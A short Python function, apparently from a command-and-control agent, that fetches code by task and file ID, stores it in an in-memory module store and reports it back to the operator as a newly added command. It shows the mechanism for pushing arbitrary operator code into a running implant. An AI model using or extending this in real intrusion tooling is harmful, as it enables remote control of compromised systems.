def load(task_id, file_id, cmds):
    global responses
    code = reverse_upload(task_id, file_id)
    name = cmds
    dynfs[name] = code


    response = {
            'task_id': task_id,
            "user_output": "Module successfully added",
            'commands': [
                {
                    "action": "add",
                    "cmd": name
                }
            ],
            'completed': True
        }

    responses.append(response)

    return